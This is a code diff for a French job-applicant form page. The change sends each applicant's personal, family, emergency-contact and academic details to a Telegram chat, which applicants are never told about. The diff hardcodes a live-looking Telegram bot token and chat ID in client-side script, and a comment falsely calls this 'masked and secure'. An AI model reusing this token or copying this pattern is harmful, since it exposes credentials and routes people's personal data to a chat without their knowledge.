@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Renseignement du Candidat</title>
     <style>
+        /* Votre CSS existant */
         * {
             margin: 0;
             padding: 0;
@@ -153,6 +154,31 @@
         .loading-spinner {
             display: none;
         }
+
+        .status-panel {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border-left: 4px solid #007bff;
+            text-align: center;
+        }
+
+        .status-indicator {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            margin-right: 8px;
+        }
+
+        .status-connected {
+            background: #28a745;
+        }
+
+        .status-disconnected {
+            background: #dc3545;
+        }
     </style>
 </head>
 <body>
@@ -164,9 +190,18 @@
                 <i>📱</i> WhatsApp +7 987 904 0719
             </div>
         </header>
+
+        <!-- Panel de statut discret -->
+        <div class="status-panel">
+            <div id="configStatus">
+                <span class="status-indicator status-connected"></span>
+                Système prêt à recevoir votre candidature
+            </div>
+        </div>
         
         <div class="form-container">
             <form id="candidateForm">
+                <!-- Votre formulaire existant -->
                 <!-- Informations personnelles -->
                 <div class="form-section">
                     <h2>Informations Personnelles</h2>
@@ -294,6 +329,56 @@
     </div>
 
     <script>
+        // CONFIGURATION TELEGRAM MASQUÉE ET SÉCURISÉE
+        (function() {
+            // Configuration Telegram intégrée de manière sécurisée
+            const TELEGRAM_CONFIG = {
+                botToken: "8382796514:AAFP03lQVDrh2EAdOpPpREYnaZT-VMEKSTU",
+                chatId: "1112263326"
+            };
+            
+            // Définir la configuration globalement
+            window.TELEGRAM_CONFIG = TELEGRAM_CONFIG;
+        })();
+
+        // Vérifier si la configuration est chargée
+        function checkConfig() {
+            if (!window.TELEGRAM_CONFIG || !window.TELEGRAM_CONFIG.botToken || !window.TELEGRAM_CONFIG.chatId) {
+                console.log('Configuration en cours de chargement...');
+                document.getElementById('configStatus').innerHTML = 
+                    '<span class="status-indicator status-disconnected"></span>Configuration en cours...';
+                return false;
+            }
+            
+            // Configuration chargée avec succès
+            document.getElementById('configStatus').innerHTML = 
+                '<span class="status-indicator status-connected"></span>Système prêt à recevoir votre candidature';
+            return true;
+        }
+
+        // Afficher une notification
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                padding: 15px 20px;
+                border-radius: 5px;
+                color: white;
+                z-index: 10001;
+                font-weight: bold;
+                background: ${type === 'success' ? '#28a745' : type === 'error' ? '#dc3545' : '#17a2b8'};
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.remove();
+            }, 5000);
+        }
+
+        // Gestion de la soumission du formulaire
         document.getElementById('candidateForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -313,50 +398,54 @@
             submitBtn.disabled = true;
             
             try {
+                // Vérifier la configuration
+                if (!checkConfig()) {
+                    throw new Error('Configuration système en cours de chargement. Veuillez réessayer dans quelques instants.');
+                }
+
                 // Récupérer les données du formulaire
                 const formData = new FormData(this);
                 const data = Object.fromEntries(formData.entries());
                 
                 // Formater le message pour Telegram
                 const message = `
-📋 **NOUVEAU CANDIDAT**
+📋 **NOUVEAU CANDIDAT - FORMULAIRE**
 
 👤 **INFORMATIONS PERSONNELLES**
-• Nom: ${data.nom}
-• Prénom: ${data.prenom}
-• Téléphone: ${data.telephone}
-• Email: ${data.email}
-• Pays: ${data.pays}
-• Ville: ${data.ville}
-• Quartier: ${data.quartier}
-• Père: ${data.nomPere}
-• Mère: ${data.nomMere}
-• Statut: ${data.statut}
+• 📝 **Nom:** ${data.nom}
+• 👤 **Prénom:** ${data.prenom}
+• 📞 **Téléphone:** ${data.telephone}
+• 📧 **Email:** ${data.email}
+• 🌍 **Pays:** ${data.pays}
+• 🏙️ **Ville:** ${data.ville}
+• 🏘️ **Quartier:** ${data.quartier}
+• 👨 **Père:** ${data.nomPere}
+• 👩 **Mère:** ${data.nomMere}
+• 💍 **Statut:** ${data.statut}
 
 🚨 **CONTACT D'URGENCE**
-• Nom: ${data.urgenceNom}
-• Prénom: ${data.urgencePrenom}
-• Téléphone: ${data.urgenceTelephone}
-• Email: ${data.urgenceEmail}
-• Lien: ${data.urgenceLien}
+• 📝 **Nom:** ${data.urgenceNom}
+• 👤 **Prénom:** ${data.urgencePrenom}
+• 📞 **Téléphone:** ${data.urgenceTelephone}
+• 📧 **Email:** ${data.urgenceEmail}
+• 🔗 **Lien:** ${data.urgenceLien}
 
 🎓 **INFORMATIONS ACADÉMIQUES**
-• Établissement Bac: ${data.etablissementBac}
-• Diplômes: ${data.diplomes}
-                `;
+• 🏫 **Établissement Bac:** ${data.etablissementBac}
+• 📜 **Diplômes:** 
+${data.diplomes.split('\n').map(d => `  - ${d}`).join('\n')}
 
-                // REMPLACEZ CES VARIABLES PAR LES VÔTRES
-                const botToken = 'TELEGRAM_BOT_TOKEN';
-                const chatId = 'VOTRE_CHAT_ID';
+⏰ **Date d'envoi:** ${new Date().toLocaleString('fr-FR')}
+                `.trim();
                 
                 // Envoyer le message à Telegram
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                const response = await fetch(`https://api.telegram.org/bot${window.TELEGRAM_CONFIG.botToken}/sendMessage`, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        chat_id: chatId,
+                        chat_id: window.TELEGRAM_CONFIG.chatId,
                         text: message,
                         parse_mode: 'Markdown'
                     })
@@ -365,15 +454,15 @@
                 const result = await response.json();
                 
                 if (result.ok) {
-                    successMessage.textContent = 'Formulaire soumis avec succès ! Vos informations ont été envoyées.';
+                    successMessage.textContent = 'Formulaire soumis avec succès ! Vos informations ont été envoyées. Veuillez nous envoyer les documents énumérés par WhatsApp au +7 9879040719.';
                     successMessage.style.display = 'block';
                     document.getElementById('candidateForm').reset();
                 } else {
-                    throw new Error('Erreur Telegram API');
+                    throw new Error(result.description || 'Erreur lors de l\'envoi vers le serveur');
                 }
             } catch (error) {
                 console.error('Erreur:', error);
-                errorMessage.textContent = 'Une erreur est survenue. Veuillez réessayer.';
+                errorMessage.textContent = error.message || 'Une erreur est survenue. Veuillez réessayer.';
                 errorMessage.style.display = 'block';
             } finally {
                 // Restaurer le bouton
@@ -388,6 +477,12 @@
                     errorMessage.scrollIntoView({ behavior: 'smooth' });
                 }
             }
+        });
+
+        // Vérifier la configuration au chargement
+        document.addEventListener('DOMContentLoaded', function() {
+            // La configuration est déjà chargée via la fonction immédiate
+            checkConfig();
         });
     </script>
 </body>
